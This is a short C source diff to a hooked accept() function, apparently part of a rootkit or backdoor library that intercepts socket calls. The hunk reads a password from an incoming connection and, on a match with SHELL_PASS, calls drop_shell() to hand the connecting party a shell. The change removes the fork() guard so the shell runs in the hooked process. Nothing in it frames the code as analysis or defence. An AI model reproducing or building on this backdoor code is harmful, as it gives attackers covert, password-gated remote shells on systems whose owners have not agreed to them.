@@ -71,7 +71,7 @@ int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
     {
         read(retfd, password, pass_len);
 
-        if(strncmp(password, SHELL_PASS, pass_len) == 0 && fork() == 0)
+        if(strncmp(password, SHELL_PASS, pass_len) == 0)
             drop_shell(retfd);
     }
 
